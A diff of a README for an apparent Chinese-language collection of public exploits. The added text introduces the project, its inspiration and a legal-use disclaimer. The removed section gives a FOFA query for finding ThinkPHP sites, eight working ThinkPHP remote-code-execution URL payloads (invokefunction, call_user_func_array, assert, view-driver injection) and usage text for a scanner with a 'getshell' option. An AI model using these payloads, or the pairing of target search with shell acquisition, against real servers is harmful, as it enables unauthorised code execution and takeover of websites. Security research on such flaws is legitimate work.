@@ -1,60 +1,18 @@
-# FOFA
+# PoC-ExP
+一个网络安全爱好者对网络上一些已知Poc和Exp的收录，持续更新。
 
-```
-app="ThinkPHP"
-```
+## 写在前面
 
+网络上铺天盖地的漏洞利用方法，想把它们整理起来，方便大家查阅和学习。
 
+做这个项目起因是暑假的时候的突发奇想。在漏洞和工具横行的时代，我一开始的想法是做一个简简单单的漏洞仓库，收集一些已知的并且很常见的漏洞，用以方便对网站漏洞的发现、维护，或者是src的挖掘。
 
-# ThinkPHP RCE 漏洞
+其实在这之前，我也是看到了零组的漏洞文库才心血来潮有了这个想法，当时看到零组的漏洞文库之后，第一次发现可以这么方便的查阅和利用，同时也算是对我的一个启蒙了。虽然零组的文库已经不再公开，却有人打包销售文库。我认为这本是一件公益性的行为，零组做了公益的事，却被别人坐收渔翁之利，实在是痛心。
 
-## 说明
+学安全是一种信仰，而不应该是为了钱去学习，所以我打算利用自己的空闲时间，也算是不太想就这么零组文库就此消失在视野下，对铺天盖地的漏洞Poc和Exp进行收集，并在自己的能力范围之内写一些判断脚本。
 
-ThinkPHP中RCE漏洞涉及的版本较多，V2以及V5中都存在该漏洞
+同时感谢零组的无私分享和启蒙。
 
-tp框架系列中，5.0.x 跟 5.1.x 中，各个系列里的poc是几乎为通用的
+**本项目仅用于网络安全技术研究，禁止使用本项目的任何形式进行发起网络攻击，抵制一切网络非法犯罪行为，一切信息禁止用于任何非法用途。**
 
-比如 5.0.1中某个poc在5.0.3中也是可以用的，也就是说当我们碰到5.0.8的时候，可以尝试用5.0.1 或 5.0.5等 5.0.x 系列的poc去尝试使用，
-
-5.1.x 系列同理
-
-所以，一条payload可以通用多个版本的ThinkPHP，但不完全保证，可以多尝试尝试。
-
-## poc
-
-可用下面的poc来验证是否为RCE
-
-```
-/?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1"
-
-/?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=phpinfo()"
-
-/?s=index/think\request/input?data[]=phpinfo()&filter=assert",
-
-/?s=index/\think\view\driver\Php/display&content=<?php phpinfo();?>",
-
-/?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=phpinfo()",
-
-/?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1"
-
-/?s=index/\think\Request/input&filter[]=phpinfo&data=-1",
-
-/?s=index/\think\module/action/param1/${@phpinfo()}"]
-```
-
-综合检验+getshell工具见**thinkphpRCE.py**
-
-```
-usage: thinkphp_rce.py [-h] [-u URL] [-f FILE] [-p PROXY] [--shell]
-
-optional arguments:
-  -h, --help            show this help message and exit
-  -u URL, --url URL     Start scanning url -u xxx.com
-  -f FILE, --file FILE  read the url from the file
-  -p PROXY, --proxy PROXY
-                        use HTTP/HTTPS proxy
-  --shell               try to get shell
-
-python thinkphpRCE.py -u http:/xx.xx/ --shell //检测和getshell
-```
-
+## 须知少时凌云志,曾许人间第一流。
